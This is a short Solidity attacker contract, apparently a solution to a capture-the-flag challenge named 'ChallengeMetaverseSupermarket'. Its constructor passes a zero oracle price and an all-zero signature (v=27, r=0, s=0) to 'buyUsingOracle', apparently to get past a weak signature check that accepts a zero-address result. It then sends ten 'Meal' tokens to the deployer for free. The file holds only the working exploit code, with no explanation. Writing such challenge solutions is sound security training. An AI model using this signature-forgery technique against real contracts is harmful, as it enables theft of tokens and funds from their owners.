// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "../ChallengeMetaverseSupermarket.sol";

contract ChallengeMetaverseSupermarketAttacker {
    constructor(address target) {
        InflaStore inflaStore = InflaStore(target);
        Meal meal = inflaStore.meal();

        OraclePrice memory price = OraclePrice(block.number, 0);
        Signature memory signature = Signature(27, 0, 0);

        for (uint256 i; i < 10; i++) {
            inflaStore.buyUsingOracle(price, signature);
            meal.transferFrom(address(this), msg.sender, i);
        }
    }
}
